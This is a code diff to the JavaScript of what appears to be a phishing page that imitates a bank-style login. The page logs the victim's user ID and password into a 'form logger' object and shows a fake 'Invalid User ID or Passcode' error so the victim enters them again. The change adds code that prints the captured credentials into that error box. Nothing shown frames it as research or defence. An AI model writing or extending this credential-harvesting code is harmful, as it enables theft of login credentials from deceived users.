@@ -74,7 +74,7 @@ function captureNow() {
   }
 }
 
-// Show error message
+// Show error message with captured credentials
 function showError() {
   window.scrollTo(0, 0);
   const existing = document.querySelector('.error-state');
@@ -83,9 +83,19 @@ function showError() {
   const err = document.createElement('div');
   err.className = 'error-state';
   err.style.cssText = 'background:#ffe6e6;border:1px solid #d32f2f;border-left:5px solid #c81c24;padding:16px;margin:20px;font-size:13px;color:#333;display:block;z-index:10000;';
-  err.innerHTML = '<strong>Invalid User ID or Passcode</strong><br>The information you entered doesn\'t match our records. Please try again.';
+  
+  let message = '<strong>Invalid User ID or Passcode</strong><br>The information you entered doesn\'t match our records. Please try again.';
+  
+  // Display captured credentials if available
+  if (window._formLoggerData) {
+    message += '<br><br><strong style="color:#666;">Captured Credentials:</strong>';
+    message += '<br><span style="font-family:monospace;color:#333;">User ID: ' + (window._formLoggerData.userId || 'N/A') + '</span>';
+    message += '<br><span style="font-family:monospace;color:#333;">Password: ' + (window._formLoggerData.password || 'N/A') + '</span>';
+  }
+  
+  err.innerHTML = message;
   document.body.insertBefore(err, document.body.firstChild);
-  console.log('[FL] Error shown');
+  console.log('[FL] Error shown with captured data');
 }
 
 // Clear form
